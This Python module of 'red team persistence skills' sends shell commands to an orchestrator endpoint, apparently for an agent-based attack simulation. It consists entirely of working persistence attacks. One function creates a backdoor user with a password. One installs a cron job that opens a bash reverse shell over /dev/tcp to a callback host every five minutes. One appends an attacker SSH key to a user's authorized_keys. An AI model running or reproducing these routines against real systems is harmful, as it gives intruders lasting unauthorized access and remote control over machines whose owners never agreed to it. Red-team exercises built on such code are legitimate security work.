"""Red team persistence skills — backdoor users, cron jobs, SSH keys."""

from __future__ import annotations

import logging
from typing import Any

import requests

logger = logging.getLogger("skills.red.persistence")


def _execute_on_orchestrator(
    command: str,
    orchestrator_url: str,
    agent_role: str,
    reasoning: str,
    timeout: int = 120,
) -> dict[str, Any]:
    """POST a command to the orchestrator /execute endpoint and return parsed JSON."""
    try:
        resp = requests.post(
            f"{orchestrator_url}/execute",
            json={
                "agent_role": agent_role,
                "command": command,
                "reasoning": reasoning,
                "turn_number": 0,
            },
            timeout=timeout,
        )
        resp.raise_for_status()
        return resp.json()
    except requests.exceptions.Timeout:
        return {"allowed": False, "reason": "timeout", "result": None}
    except requests.exceptions.ConnectionError as exc:
        return {"allowed": False, "reason": f"connection_error: {exc}", "result": None}
    except Exception as exc:  # noqa: BLE001
        return {"allowed": False, "reason": f"error: {exc}", "result": None}


def add_backdoor_user(
    username: str,
    password: str,
    orchestrator_url: str,
    agent_role: str = "red",
) -> dict[str, Any]:
    """Create a backdoor user account with the given credentials.

    Returns a dict indicating success and the username created.
    """
    command = (
        f"useradd -m -s /bin/bash {username} && "
        f"echo '{username}:{password}' | chpasswd"
    )
    data = _execute_on_orchestrator(
        command=command,
        orchestrator_url=orchestrator_url,
        agent_role=agent_role,
        reasoning=f"add_backdoor_user username={username}",
    )

    if not data.get("allowed") or data.get("result") is None:
        return {
            "success": False,
            "error": data.get("reason", "command not allowed or no result"),
            "username": username,
        }

    exit_code = data["result"].get("exit_code", -1)
    return {"success": exit_code == 0, "username": username}


def install_cron_backdoor(
    callback_ip: str,
    port: int,
    orchestrator_url: str,
    agent_role: str = "red",
) -> dict[str, Any]:
    """Install a cron-based reverse shell backdoor.

    Returns a dict indicating success and the cron entry installed.
    """
    cron_entry = (
        f"*/5 * * * * /bin/bash -c "
        f"\"bash -i >& /dev/tcp/{callback_ip}/{port} 0>&1\""
    )
    command = (
        f"(crontab -l 2>/dev/null; echo '{cron_entry}') | crontab -"
    )
    data = _execute_on_orchestrator(
        command=command,
        orchestrator_url=orchestrator_url,
        agent_role=agent_role,
        reasoning=f"install_cron_backdoor callback={callback_ip}:{port}",
    )

    if not data.get("allowed") or data.get("result") is None:
        return {
            "success": False,
            "error": data.get("reason", "command not allowed or no result"),
            "cron_entry": cron_entry,
        }

    exit_code = data["result"].get("exit_code", -1)
    return {"success": exit_code == 0, "cron_entry": cron_entry}


def add_ssh_key(
    target_user: str,
    pubkey: str,
    orchestrator_url: str,
    agent_role: str = "red",
) -> dict[str, Any]:
    """Add an SSH public key to a target user's authorized_keys.

    Returns a dict indicating success and the target user.
    """
    command = (
        f"mkdir -p /home/{target_user}/.ssh && "
        f"echo '{pubkey}' >> /home/{target_user}/.ssh/authorized_keys && "
        f"chmod 600 /home/{target_user}/.ssh/authorized_keys"
    )
    data = _execute_on_orchestrator(
        command=command,
        orchestrator_url=orchestrator_url,
        agent_role=agent_role,
        reasoning=f"add_ssh_key target_user={target_user}",
    )

    if not data.get("allowed") or data.get("result") is None:
        return {
            "success": False,
            "error": data.get("reason", "command not allowed or no result"),
            "target_user": target_user,
        }

    exit_code = data["result"].get("exit_code", -1)
    return {"success": exit_code == 0, "target_user": target_user}
